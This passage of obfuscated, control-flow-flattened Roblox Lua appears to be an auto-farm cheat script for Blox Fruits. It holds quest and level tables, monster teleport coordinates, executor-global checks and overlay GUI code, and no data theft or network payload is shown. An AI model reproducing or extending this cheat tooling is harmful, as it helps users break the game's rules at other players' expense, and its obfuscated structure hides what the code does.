                    elseif bomayyeuvietnamKaitunRunning2 <= 27 then
                      frame:WaitForChild("Level")

                      localPlayer:WaitForChild("Data"):WaitForChild("Fragments")
                      localPlayer:WaitForChild("Data"):WaitForChild("Beli")

                      val20 = 2800
                      game:service("VirtualInputManager")
                      frame = game
                      bomayyeuvietnamKaitunRunning2 = 204
                    else
                      new3[dropShadow2] = main

                      new3.CQ = CFrame.new(
                        -6064.06885, 15.2422857, -4902.97852, 0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578
                      )

                      main = CFrame.new
                      bomayyeuvietnamKaitunRunning2 = 113
                      dropShadow2 = "CMon"
                      new4 = -5769.2041
                      new5 = 37.9288292
                      fromRGB = -4468.38721
                      new6 = -0.569419742
                      cframe2 = -2.49055017e-8
                      top = 0.822046936
                      udim2 = -6.96206541e-8
                      textLabel2 = 1
                      udim22 = -1.79282633e-8
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 31 then
                    if bomayyeuvietnamKaitunRunning2 <= 29 then
                      bomayyeuvietnamKaitunRunning2 = frame and 275 or 363
                    elseif bomayyeuvietnamKaitunRunning2 <= 30 then
                      top[udim2] = textLabel2.new(
                        -1876.95959, 192.610947, -10542.2939, 0.0553516336, -2.83836812e-8, 0.998466909, -6.89634405e-10, 1, 2.84654931e-8, -0.998466909, -2.26418861e-9, 0.0553516336
                      )

                      udim2 = {
                        Min = 2125, Max = 2149, Ms = "Ice Cream Chef", Mon = "Ice Cream Chef", Quest = "IceCreamIslandQuest", }

                      bomayyeuvietnamKaitunRunning2 = 78
                    else
                      frame[udim2] = udim22(uiGradient, fromRGB2, 0, 420)

                      val24.Size = UDim2.new(1, -24, 1, -24)
                      val24.BackgroundColor3 = val25.Background
                      val24.BackgroundTransparency = 0.04
                      val24.BorderSizePixel = 0

                      val26(val24, 9)
                      val27(val24, val25.Primary, 1.5, 0.05)
                      bomayyeuvietnamKaitunRunning2 = 257
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 32 then
                    textLabel[levelLabel] = new3[dropShadow2](
                      -11194.541992, 442.027954, -8608.80664
                    )

                    levelLabel = {
                      Min = 1825, Max = 1849, Ms = "Forest Pirate", Mon = "Forest Pirate", Quest = "DeepForestIsland", QLv = 1, Next = 1850, }

                    dropShadow2 = CFrame.new
                    bomayyeuvietnamKaitunRunning2 = 349
                    new3 = "CQ"
                  elseif bomayyeuvietnamKaitunRunning2 <= 33 then
                    val46[val47] = val48(
                      new8, val49, new9, 0.934615612, -9.33109447e-8, -0.355659455, 9.17655143e-8, 1, -2.12154276e-8, 0.355659455, -1.28090019e-8, 0.934615612
                    )

                    val46.CMon = CFrame.new(
                      11019.1318, -2146.06812, 9342.3916, -0.719955266, -1.74275385e-8, 0.69402045, 5.76556367e-8, 1, 8.49211546e-8, -0.69402045, 1.01153624e-7, -0.719955266
                    )

                    val47 = {}
                    bomayyeuvietnamKaitunRunning2 = 82
                    val48 = "Min"
                  else
                    bomayyeuvietnamKaitunRunning2 = frame and 1 or 64
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 40 then
                  if bomayyeuvietnamKaitunRunning2 <= 37 then
                    if bomayyeuvietnamKaitunRunning2 <= 35 then
                      new6.CQ = CFrame.new(
                        968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-8, -0.493826836, 1.44108379e-8, 1, 5.38534195e-9, 0.493826836, -2.43357912e-9, -0.869560242
                      )

                      new6.CMon = CFrame.new(917.96057, 136.89932, 33343.41406)

                      cframe2 = { Min = 1325 }
                      bomayyeuvietnamKaitunRunning2 = 306
                      top = "Max"
                    elseif bomayyeuvietnamKaitunRunning2 <= 36 then
                      new6[dutDit] = new[fromRGB2](0, 33, 0, 18)
                      new6.Selectable = false

                      new6.FontFace = Font.new(
                        "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                      )

                      new6.Text = "Frag: N/A"

                      new = Color3
                      bomayyeuvietnamKaitunRunning2 = 58
                      dutDit = "TextColor3"
                    else
                      new5[fromRGB] = new6(
                        cframe2, top, udim2, textLabel2, udim22, under, -1.23782129e-7, 1, -4.93306951e-9, -0.982100308, -1.22495649e-7, -0.188358366
                      )

                      fromRGB = {
                        Min = 375, Max = 399, Ms = "Fishman Warrior", Mon = "Fishman Warrior", Quest = "FishmanQuest", QLv = 1, Next = 400, }

                      cframe2 = CFrame
                      bomayyeuvietnamKaitunRunning2 = 265
                      new6 = "CQ"
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 38 then
                    typeAccountScroll[itemLabel1] = new2(
                      -2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268
                    )

                    typeAccountScroll.CMon = CFrame.new(
                      -2842.69922, 72.9919434, -2901.90479, -0.762281299, 0, -0.64724648, 0, 1.00000012, 0, 0.64724648, 0, -0.762281299
                    )

                    bomayyeuvietnamKaitunRunning2 = 226
                  elseif bomayyeuvietnamKaitunRunning2 <= 39 then
                    dutDit[new] = 100

                    new = {
                      Item = "Wardens Sword", Boss = "Chief Warden", Type = "Sword", Sea = 1, MinLevel = 100, }

                    divider = {
                      Item = "Pole (1st Form)", Boss = "Thunder God", Type = "Sword", Sea = 1, }

                    bomayyeuvietnamKaitunRunning2 = 267
                  else
                    function helper4(val101)
                      local val102 = 11
                      local kaitunInventoryCache2 = nil
                      local val103 = nil

                      while true do
                        if val102 <= 6 then
                          if val102 <= 2 then
                            if val102 <= 0 then
                              local time2 = kaitunInventoryCache2.Time

                              if time2 then
                                val102 = 7
                                val103 = time2
                              else
                                val102 = 2
                              end
                            elseif val102 <= 1 then
                              val103 = type(kaitunInventoryCache2.ByName) ~= "table"
                              val102 = 13
                            else
                              val102 = 7
                              val103 = 0
                            end

                            continue
                          end

                          if val102 <= 4 then
                            if val102 <= 3 then
                              for key4 in pairs(val33) do
                                local element10 = kaitunInventoryCache2.ByName[key4]

                                if element10 then
                                  val39[key4] = math.max(
                                    val39[key4] or 0, tonumber(element10.Mastery) or 0
                                  )
                                end
                              end

                              val40 = val103
                              val102 = 4
                              val101 = true
                              continue
                            end

                            return val101
                          end

                          if val102 <= 5 then
                            val102 = val101 and 9 or 3
                          else
                            val102 = val103 and 13 or 1
                          end
                        else
                          if val102 <= 9 then
                            if val102 <= 7 then
                              local val104 = not val101

                              if val104 then
                                val102 = 12
                              else
                                val102 = 5
                                val101 = val104
                              end

                              continue
                            end

                            break
                          end

                          if val102 <= 11 then
                            if val102 <= 10 then
                              val103 = kaitunInventoryCache2.Ready ~= true
                              val102 = 6
                            else
                              GetInventory(val101 == true)
                              kaitunInventoryCache2 = getgenv().KaitunInventoryCache
                              local val105 = type(kaitunInventoryCache2) ~= "table"

                              if val105 then
                                val102 = 6
                                val103 = val105
                              else
                                val102 = 10
                              end
                            end
                          elseif val102 <= 12 then
                            val101 = val40 == val103
                            val102 = 5
                          else
                            val102 = val103 and 8 or 0
                          end
                        end
                      end

                      if val102 <= 8 then
                        return false
                      end

                      return true
                    end

                    helper2 = nil

                    function helper2(val106)
                      local val107 = 0
                      local findFirstChild2 = nil

                      while true do
                        if not (val107 <= 3) then
                          if val107 <= 5 then
                            if val107 <= 4 then
                              val107 = findFirstChild2 and 7 or 6
                            else
                              findFirstChild2 = localPlayer.Backpack:FindFirstChild(val106)
                              val107 = 7
                            end
                          elseif val107 <= 6 then
                            local backpack2 = localPlayer.Backpack

                            if backpack2 then
                              val107 = 5
                            else
                              val107 = 7
                              findFirstChild2 = backpack2
                            end
                          else
                            val107 = findFirstChild2 and 2 or 3
                          end

                          continue
                        end

                        if val107 <= 1 then
                          if val107 <= 0 then
                            local character2 = localPlayer.Character

                            if character2 then
                              val107 = 1
                            else
                              val107 = 4
                              findFirstChild2 = character2
                            end
                          else
                            findFirstChild2 = localPlayer.Character:FindFirstChild(val106)
                            val107 = 4
                          end

                          continue
                        end

                        if not (val107 <= 2) then
                          findFirstChild2 = localPlayer:FindFirstChild(val106)
                          val107 = 2
                          continue
                        end

                        break
                      end

                      return findFirstChild2
                    end

                    helper3 = nil

                    function helper3(val108)
                      local val109 = 8
                      local level2 = nil
                      local val110 = nil
                      local val111, max2, val112

                      while true do
                        if val109 <= 4 then
                          if val109 <= 1 then
                            if val109 <= 0 then
                              return nil
                            end

                            val109 = 3
                            level2 = 0
                            continue
                          end

                          if val109 <= 2 then
                            val110[val108] = max2(val111, level2)
                            val109 = 6
                          elseif val109 <= 3 then
                            val110 = val39
                            max2 = math.max
                            local val113 = val39[val108]

                            if val113 then
                              val109 = 2
                              val111 = val113
                            else
                              val109 = 4
                            end
                          else
                            val109 = 2
                            val111 = 0
                          end
                        else
                          if val109 <= 6 then
                            if val109 <= 5 then
                              val109 = level2 and 3 or 1
                              continue
                            end

                            break
                          end

                          if val109 <= 7 then
                            level2 = val112:FindFirstChild("Level")
                            val109 = level2 and 9 or 5
                          elseif val109 <= 8 then
                            local val114 = helper2(val108)

                            if not val114 then
                              val109 = 0
                            else
                              val109 = 7
                              val112 = val114
                            end
                          else
                            level2 = tonumber(level2.Value)
                            val109 = 5
                          end
                        end
                      end

                      return val112
                    end

                    function x(val115)
                      local val116 = 1

                      while true do
                        if val116 <= 0 then
                          val115 = val39[val115] ~= nil
                          val116 = 2
                          continue
                        end

                        if val116 <= 1 then
                          helper4(false)
                          local val117 = helper3(val115) ~= nil

                          if val117 then
                            val116 = 2
                            val115 = val117
                          else
                            val116 = 0
                          end

                          continue
                        end

                        break
                      end

                      return val115
                    end

                    function G()
                      local val118 = 1
                      local val119

                      while not (val118 <= 0) do
                        helper4(false)

                        for key5 in pairs(val33) do
                          helper3(key5)
                        end

                        val119 = {}

                        for key6, value3 in pairs(val39) do
                          val119[key6] = value3
                        end

                        val118 = 0
                      end

                      return val119
                    end

                    function m(val120)
                      local val121 = 21
                      local val122 = nil

                      while true do
                        if val121 <= 10 then
                          if val121 <= 4 then
                            if val121 <= 1 then
                              if val121 <= 0 then
                                val121 = 17
                                val122 = 0
                              else
                                val121 = 14
                                val122 = 0
                              end
                            elseif val121 <= 2 then
                              Death_Step = val120[val122] ~= nil
                              Sharkman_Karate_C = val120["Sharkman Karate"] ~= nil
                              Electric_Claw_C = val120["Electric Claw"] ~= nil
                              Dragon_Talon_C = val120["Dragon Talon"] ~= nil
                              God_Human_C = val120.Godhuman ~= nil
                              local blackLeg2 = val120["Black Leg"]

                              if blackLeg2 then
                                val121 = 11
                                val122 = blackLeg2
                              else
                                val121 = 15
                              end
                            elseif val121 <= 3 then
                              Dragon_Talon_C_M = val122 >= 400
                              local godhuman2 = val120.Godhuman

                              if godhuman2 then
                                val121 = 19
                                val120 = godhuman2
                              else
                                val121 = 9
                              end
                            else
                              val121 = 8
                              val122 = 0
                            end
                          elseif val121 <= 7 then
                            if val121 <= 5 then
                              val121 = 22
                              val122 = 0
                            elseif val121 <= 6 then
                              val121 = 3
                              val122 = 0
                            else
                              Super_humanw_C_M = val122 >= 400
                              local deathStep2 = val120["Death Step"]

                              if deathStep2 then
                                val121 = 22
                                val122 = deathStep2
                              else
                                val121 = 5
                              end
                            end
                          elseif val121 <= 8 then
                            Electro_C_M = val122 >= 400
                            local fishmanKarate2 = val120["Fishman Karate"]

                            if fishmanKarate2 then
                              val121 = 14
                              val122 = fishmanKarate2
                            else
                              val121 = 1
                            end
                          elseif val121 <= 9 then
                            val121 = 19
                            val120 = 0
                          else
                            val121 = 20
                            val122 = 0
                          end

                          continue
                        end

                        if not (val121 <= 16) then
                          if val121 <= 19 then
                            if val121 <= 17 then
                              Electric_Claw_C_M = val122 >= 400
                              local dragonTalon2 = val120["Dragon Talon"]

                              if dragonTalon2 then
                                val121 = 3
                                val122 = dragonTalon2
                              else
                                val121 = 6
                              end
                            elseif val121 <= 18 then
                              val121 = 7
                              val122 = 0
                            else
                              God_Human_C_M = val120 >= 400
                              val121 = 12
                            end
                          elseif val121 <= 20 then
                            Sharkman_Karate_C_M = val122 >= 400
                            local electricClaw2 = val120["Electric Claw"]

                            if electricClaw2 then
                              val121 = 17
                              val122 = electricClaw2
                            else
                              val121 = 0
                            end
                          elseif val121 <= 21 then
                            Black_Leg_C = val120["Black Leg"] ~= nil
                            Electro_C = val120.Electro ~= nil
                            Fishman_Karate_C = val120["Fishman Karate"] ~= nil
                            Dragon_Claw_C = val120["Dragon Claw"] ~= nil
                            Super_human = val120.Superhuman ~= nil
                            val121 = 2
                            val122 = "Death Step"
                          else
                            Death_Step_C_M = val122 >= 400
                            local sharkmanKarate2 = val120["Sharkman Karate"]

                            if sharkmanKarate2 then
                              val121 = 20
                              val122 = sharkmanKarate2
                            else
                              val121 = 10
                            end
                          end

                          continue
                        end

                        if not (val121 <= 13) then
                          if val121 <= 14 then
                            Fishman_Karate_C_M = val122 >= 400
                            local dragonClaw2 = val120["Dragon Claw"]

                            if dragonClaw2 then
                              val121 = 16
                              val122 = dragonClaw2
                            else
                              val121 = 13
                            end
                          elseif val121 <= 15 then
                            val121 = 11
                            val122 = 0
                          else
                            Dragon_Claw_C_M = val122 >= 400
                            local superhuman2 = val120.Superhuman

                            if superhuman2 then
                              val121 = 7
                              val122 = superhuman2
                            else
                              val121 = 18
                            end
                          end

                          continue
                        end

                        if val121 <= 11 then
                          Black_Leg_C_M = val122 >= 400
                          local electro2 = val120.Electro

                          if electro2 then
                            val121 = 8
                            val122 = electro2
                          else
                            val121 = 4
                          end

                          continue
                        end

                        if not (val121 <= 12) then
                          val121 = 16
                          val122 = 0
                          continue
                        end

                        break
                      end
                    end

                    cframe = {}
                    dutDit = { Name = "Black Leg", Target = 300 }
                    new = { Name = "Electro", Target = 300 }
                    divider = { Name = "Fishman Karate" }
                    bomayyeuvietnamKaitunRunning2 = 15
                    frame = "Order"
                    divider2 = "Target"
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 43 then
                  if bomayyeuvietnamKaitunRunning2 <= 41 then
                    cframe[dutDit] = new

                    cframe.PositionsBySea = {
                      [2] = CFrame.new(
                        -2599.621826, 238.198334, -10315.998047, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106
                      ), [3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469), }

                    bomayyeuvietnamKaitunRunning2 = 240
                  elseif bomayyeuvietnamKaitunRunning2 <= 42 then
                    val23[frame] = cframe[dutDit](77.92, 24.8, -12247.26)
                    val23["Chocolate Bar Battler"] = CFrame.new(717.46, 24.8, -12637.87)
                    val23["Sweet Thief"] = CFrame.new(-140.26, 24.71, -12652.31)

                    cframe = CFrame.new(56.08, 24.86, -12953)
                    bomayyeuvietnamKaitunRunning2 = 73
                    frame = "Candy Rebel"
                  else
                    cframe[fromRGB2] = fontWeight(cframe3, val42, val43, val44)
                    cframe.Size = UDim2.new(1, -47, 1, -47)
                    cframe.Selectable = false

                    dutDit.CornerRadius = UDim.new(0, 5)
                    dutDit.Parent = cframe

                    fromRGB2 = Color3.fromRGB
                    bomayyeuvietnamKaitunRunning2 = 94
                    dutDit = "Color"
                    fontWeight = 135
                    cframe3 = 206
                    val42 = 250
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 44 then
                  cframe = {}

                  dutDit = {
                    Min = 1500, Max = 1524, Ms = "Pirate Millionaire", Mon = "Pirate Millionaire", Quest = "PiratePortQuest", QLv = 1, Next = 1525, }

                  divider = CFrame.new
                  bomayyeuvietnamKaitunRunning2 = 62
                  new = "CQ"
                  divider2 = -290.074677
                  typeAccountScroll = 42.9034653
                  itemLabel1 = 5581.58984
                  new2 = 0.965929627
                  itemLabel12 = 0
                elseif bomayyeuvietnamKaitunRunning2 <= 45 then
                  cframe[dutDit] = 3

                  val33[frame] = cframe

                  val33["Dragon Talon"] = {
                    Names = { "Uzoth" }, Position = CFrame.new(5662.28857, 1206.85913, 870.284912), Command = { "BuyDragonTalon" }, MinSea = 3, }

                  cframe = {}
                  bomayyeuvietnamKaitunRunning2 = 155
                  frame = "Godhuman"
                  dutDit = "Names"
                else
                  new5[fromRGB] = "Living Zombie"
                  new5.Mon = "Living Zombie"
                  new5.Quest = "HauntedQuest1"
                  new5.QLv = 2
                  new5.Next = 2025
                  new5.Fallback = "Reborn Skeleton"
                  new5.CQ = CFrame.new(-9480.827148, 142.130661, 5566.071289)

                  new6 = CFrame.new
                  bomayyeuvietnamKaitunRunning2 = 47
                  fromRGB = "CMon"
                  cframe2 = -10125.234375
                  top = 183.947052
                end
              elseif bomayyeuvietnamKaitunRunning2 <= 69 then
                if bomayyeuvietnamKaitunRunning2 <= 57 then
                  if bomayyeuvietnamKaitunRunning2 <= 51 then
                    if bomayyeuvietnamKaitunRunning2 <= 48 then
                      if bomayyeuvietnamKaitunRunning2 <= 47 then
                        new5[fromRGB] = new6(cframe2, top, 6242.013671)

                        fromRGB = {
                          Min = 2025, Max = 2049, Ms = "Demonic Soul", Mon = "Demonic", Quest = "HauntedQuest2", QLv = 1, Next = 2050, Fallback = "Living Zombie", }

                        cframe2 = CFrame.new
                        bomayyeuvietnamKaitunRunning2 = 10
                        new6 = "CQ"
                      else
                        divider2[typeAccountScroll] = itemLabel1(
                          new2, itemLabel12, textLabel, levelLabel, new3, dropShadow2, main, new4, new5, fromRGB, new6, cframe2
                        )

                        divider2.CMon = CFrame.new(6488.915527, 383.383758, -110.66246)

                        typeAccountScroll = {
                          Min = 1625, Max = 1649, Ms = "Female Islander", Mon = "Female Islander", Quest = "AmazonQuest2", QLv = 1, }

                        bomayyeuvietnamKaitunRunning2 = 90
                        itemLabel1 = "Next"
                        new2 = 1650
                      end
                    elseif bomayyeuvietnamKaitunRunning2 <= 49 then
                      itemLabel12[textLabel] = levelLabel
                      itemLabel12.Mon = "Vampire"
                      itemLabel12.Quest = "ZombieQuest"
                      itemLabel12.QLv = 2
                      itemLabel12.Next = 1000
                      itemLabel12.Fallback = "Zombie"

                      levelLabel = CFrame.new
                      bomayyeuvietnamKaitunRunning2 = 325
                      textLabel = "CQ"
                      new3 = -5497.06152
                      dropShadow2 = 47.5923004
                      main = -795.237061
                      new4 = -0.29242146
                      new5 = 0
                      fromRGB = -0.95628953
                      new6 = 0
                      cframe2 = 1
                      top = 0
                      udim2 = 0.95628953
                      textLabel2 = 0
                      udim22 = -0.29242146
                    elseif bomayyeuvietnamKaitunRunning2 <= 50 then
                      itemLabel1[new2] = itemLabel12(
                        textLabel, levelLabel, new3, dropShadow2, main, new4, new5, fromRGB, new6, cframe2, top, -0.342042685
                      )

                      itemLabel1.CMon = CFrame.new(
                        1376.86401, 97.2779999, -1396.93115, -0.986755967, 7.71178321e-8, -0.162211925, 7.71531674e-8, 1, 6.08143536e-9, 0.162211925, -6.51427134e-9, -0.986755967
                      )

                      new2 = { Min = 120, Max = 174, Ms = "Chief Petty Officer" }
                      bomayyeuvietnamKaitunRunning2 = 219
                      itemLabel12 = "Mon"
                    else
                      textLabel2 = textLabel2[udim22]("TextLabel")
                      udim22 = Instance.new("UIGradient")
                      under = Instance.new("TextLabel")
                      uiGradient = Instance.new("UIGradient")
                      new7 = Instance.new("ImageLabel")
                      coinCard.Name = "CoinCard"
                      fontWeight = coreGui
                      bomayyeuvietnamKaitunRunning2 = 86
                      fromRGB2 = "Parent"
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 54 then
                    if bomayyeuvietnamKaitunRunning2 <= 52 then
                      dropShadow2[main] = new4.new(
                        -6064.06885, 15.2422857, -4902.97852, 0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578
                      )

                      new4 = CFrame.new
                      bomayyeuvietnamKaitunRunning2 = 21
                      main = "CMon"
                      new5 = -6401.27979
                      fromRGB = 15.9775667
                      new6 = -5948.24316
                      cframe2 = 0.388303697
                      top = 0
                      udim2 = -0.921531856
                      textLabel2 = 0
                      udim22 = 1
                      under = 0
                      uiGradient = 0.921531856
                      new7 = 0
                      fromRGB2 = 0.388303697
                    elseif bomayyeuvietnamKaitunRunning2 <= 53 then
                      itemLabel12.Name = "Fishman Karate"
                      itemLabel12.Target = 400
                      itemLabel12.MinSea = 3

                      textLabel = { Name = "Sharkman Karate", BuyOnly = true }
                      levelLabel = { Name = "Electro", Target = 400, MinSea = 3 }
                      new3 = { Name = "Electric Claw" }
                      bomayyeuvietnamKaitunRunning2 = 368
                      dropShadow2 = "BuyOnly"
                    else
                      local create3 = val28:Create(dutDit, tweenInfo, {
                        BackgroundTransparency = 0, })

                      divider.MouseButton1Down:Connect(function()
                        local val123 = 1

                        while true do
                          if val123 <= 3 then
                            if val123 <= 1 then
                              if val123 <= 0 then
                                create3:Play()
                                val123 = 5
                              else
                                val123 = val29 and 4 or 2
                              end
                            elseif val123 <= 2 then
                              val28:Create(nil, tweenInfo, { Size = size }):Play()
                              val123 = 3
                            else
                              val29 = not val29
                              val123 = val30 and 0 or 6
                            end

                            continue
                          end

                          if val123 <= 5 then
                            if val123 <= 4 then
                              val28:Create(nil, tweenInfo, { Size = udim }):Play()
                              val123 = 3
                            else
                              val30 = not val30
                              coinCard.Enabled = not coinCard.Enabled

                              val28:Create(cameraBlur, tweenInfo, {
                                Size = coinCard.Enabled and 8 or 0, }):Play()

                              val123 = 7
                            end

                            continue
                          end

                          if val123 <= 6 then
                            create:Play()
                            val123 = 5
                            continue
                          end

                          break
                        end
                      end)

                      local val124 = placeId == 2753915549

                      if val124 then
                        bomayyeuvietnamKaitunRunning2 = 110
                        frame = val124
                      else
                        bomayyeuvietnamKaitunRunning2 = 172
                      end
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 55 then
                    cframe.MinSea = 1
                    cframe.BeliCost = 750000

                    val33[frame] = cframe
                    cframe = { Names = { "Sabi" } }
                    new = {}
                    divider2 = CFrame.new
                    bomayyeuvietnamKaitunRunning2 = 242
                    frame = "Dragon Claw"
                    dutDit = "PositionsBySea"
                    divider = 2
                    typeAccountScroll = 699.028992
                    itemLabel1 = 185.660995
                    new2 = 654.89502
                    itemLabel12 = -0.971684337
                    textLabel = 0
                    levelLabel = -0.236283794
                    new3 = 0
                    dropShadow2 = 1
                    main = 0
                    new4 = 0.236283794
                    new5 = 0
                    fromRGB = -0.971684337
                  elseif bomayyeuvietnamKaitunRunning2 <= 56 then
                    new[divider] = divider2(
                      typeAccountScroll, 33.929848, -4767.102539, -0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, -0.453972578
                    )

                    new[3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469)

                    cframe[dutDit] = new
                    cframe.Command = { "BuyElectro" }
                    cframe.MinSea = 1

                    bomayyeuvietnamKaitunRunning2 = 259
                    dutDit = "BeliCost"
                  else
                    bomayyeuvietnamKaitunRunning2 = getgenv().BOMAYYEUVIETNAMKaitunRunning
                        and 136
                      or 157
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 63 then
                  if bomayyeuvietnamKaitunRunning2 <= 60 then
                    if bomayyeuvietnamKaitunRunning2 <= 58 then
                      new6[dutDit] = new.fromRGB(255, 255, 255)
                      new6.TextSize = 16
                      new6.TextXAlignment = Enum.TextXAlignment.Left
                      new6.TextYAlignment = Enum.TextYAlignment.Bottom

                      cframe2.BackgroundTransparency = 1
                      cframe2.Parent = cframe

                      new = UDim2
                      bomayyeuvietnamKaitunRunning2 = 207
                      dutDit = "Position"
                      fromRGB2 = "new"
                    elseif bomayyeuvietnamKaitunRunning2 <= 59 then
                      new2[itemLabel12] = textLabel(
                        levelLabel, new3, dropShadow2, main, new4, new5, fromRGB, new6, cframe2, 0.95628953, 0, -0.29242146
                      )

                      new2.CMon = CFrame.new(
                        -5649.23438, 126.0578, -737.773743, 0.355238914, -8.10359282e-8, 0.934775114, 1.65461245e-8, 1, 8.04023372e-8, -0.934775114, -1.3095117e-8, 0.355238914
                      )

                      itemLabel12 = { Min = 975, Max = 999 }
                      bomayyeuvietnamKaitunRunning2 = 49
                      textLabel = "Ms"
                      levelLabel = "Vampire"
                    else
                      typeAccountScroll[divider] = divider2
                      typeAccountScroll.BackgroundTransparency = 1

                      local uiListLayout2 = Instance.new("UIListLayout")
                      uiListLayout2.Parent = typeAccountScroll
                      uiListLayout2.Padding = UDim.new(0, 5)
                      uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder

                      for index2, value4 in ipairs({ itemLabel1, new2, itemLabel12 }) do
                        value4.LayoutOrder = index2
                        value4.Text = string.format("Item slot %02d", index2)
                        value4.TextColor3 = val25.Muted

                        cframe2(value4)
                      end

                      bomayyeuvietnamKaitunRunning2 = 105
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 61 then
                    new5[dutDit] = new[fromRGB2].Bottom

                    fromRGB.BackgroundTransparency = 1
                    fromRGB.Parent = cframe
                    fromRGB.Position = UDim2.new(0.070000000298023, 0, 0.89999997615814, 0)
                    fromRGB.Size = UDim2.new(0, 0, 0, 18)
                    fromRGB.Selectable = false

                    bomayyeuvietnamKaitunRunning2 = 89
                  elseif bomayyeuvietnamKaitunRunning2 <= 62 then
                    dutDit[new] = divider(
                      divider2, typeAccountScroll, itemLabel1, new2, itemLabel12, -0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627
                    )

                    dutDit.CMon = CFrame.new(81.164993, 43.755737, 5724.702148)

                    new = {
                      Min = 1525, Max = 1574, Ms = "Pistol Billionaire", Mon = "Pistol Billionaire", }

                    bomayyeuvietnamKaitunRunning2 = 25
                    divider = "Quest"
                  else
                    textLabel[levelLabel] = new3(
                      dropShadow2, main, new4, new5, fromRGB, new6, cframe2, top, udim2, textLabel2, udim22, 0.465965867
                    )

                    levelLabel = {
                      Min = 190, Max = 209, Ms = "Prisoner", Mon = "Prisoner", Quest = "PrisonerQuest", QLv = 1, Next = 210, }

                    dropShadow2 = CFrame.new
                    bomayyeuvietnamKaitunRunning2 = 321
                    new3 = "CQ"
                    main = 5308.93115
                    new4 = 1.65517521
                    new5 = 475.120514
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 66 then
                  if bomayyeuvietnamKaitunRunning2 <= 64 then
                    if New_World then
                      bomayyeuvietnamKaitunRunning2 = 156
                    else
                      bomayyeuvietnamKaitunRunning2 = 338
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 65 then
                    frame = frame.PlayerAdded:Wait()
                    bomayyeuvietnamKaitunRunning2 = 269
                  else
                    divider[frame] = new.fromRGB(27, 42, 53)
                    val28 = tweenService
                    val29 = false
                    udim = UDim2.new(0, 40, 0, 40)
                    frame = UDim2.new
                    bomayyeuvietnamKaitunRunning2 = 72
                    new = 0
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 67 then
                  dropShadow2[dutDit] = Enum.TextYAlignment.Bottom

                  main.BackgroundTransparency = 1
                  main.Parent = cframe
                  main.Position = UDim2.new(0.75, 0, 0.89999997615814, 0)
                  main.Size = UDim2.new(0, 0, 0, 18)

                  bomayyeuvietnamKaitunRunning2 = 342
                  dutDit = "Selectable"
                elseif bomayyeuvietnamKaitunRunning2 <= 68 then
                  new[1] = divider

                  cframe[dutDit] = new
                  cframe.MinSea = 1
                  cframe.BeliCost = 150000

                  val33[frame] = cframe
                  cframe = { Names = { "Mad Scientist" } }
                  new = { CFrame.new(-4631.24, 13.46, -355.36) }
                  divider2 = CFrame.new
                  bomayyeuvietnamKaitunRunning2 = 56
                  frame = "Electro"
                  dutDit = "PositionsBySea"
                  divider = 2
                  typeAccountScroll = -4866.150391
                else
                  uiGradient[new7] = fromRGB2
                  uiGradient.CQ = CFrame.new(-1928.31763, 37.7296638, -12840.626)
                  uiGradient.CMon = CFrame.new(-1818.3479, 93.412757, -12887.66015)

                  new7 = {
                    Min = 2300, Max = 2324, Ms = "Cocoa Warrior", Mon = "Cocoa Warrior", }

                  bomayyeuvietnamKaitunRunning2 = 292
                end
              elseif bomayyeuvietnamKaitunRunning2 <= 81 then
                if bomayyeuvietnamKaitunRunning2 <= 75 then
                  if bomayyeuvietnamKaitunRunning2 <= 72 then
                    if bomayyeuvietnamKaitunRunning2 <= 70 then
                      levelLabel[dutDit] = new

                      levelLabel.FontFace = Font.new(
                        "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                      )

                      levelLabel.Text = "Level: N/A    Third Sea : Ã¢ÂÂŒ"
                      levelLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

                      bomayyeuvietnamKaitunRunning2 = 266
                      dutDit = "TextSize"
                      new = 16
                    elseif bomayyeuvietnamKaitunRunning2 <= 71 then
                      new2[dutDit] = UDim2.new(0, 0, 0, 20)
                      new2.Size = UDim2.new(1, 0, 0, 18)
                      new2.Selectable = false

                      new = Font.new
                      fontWeight = Enum.FontWeight.Bold
                      bomayyeuvietnamKaitunRunning2 = 8
                      dutDit = "FontFace"
                      fromRGB2 = "rbxasset://fonts/families/GothamSSm.json"
                    else
                      size = frame(new, 30, 0, 30)

                      tweenInfo = TweenInfo.new(
                        0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
                      )

                      val30 = false
                      create = val28:Create(dutDit, tweenInfo, { BackgroundTransparency = 0.18 })
                      bomayyeuvietnamKaitunRunning2 = 54
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 73 then
                    val23[frame] = cframe
                    val23["Candy Pirate"] = CFrame.new(-1372.53, 32.11, -14506.54)
                    val23["Snow Demon"] = CFrame.new(-865.98, 13.21, -14589.03)
                    val23["Island Boy"] = CFrame.new(-16736.23, 20.54, -131.72)

                    cframe = CFrame.new
                    bomayyeuvietnamKaitunRunning2 = 127
                    frame = "Isle Outlaw"
                  elseif bomayyeuvietnamKaitunRunning2 <= 74 then
                    divider2[typeAccountScroll] = itemLabel1(
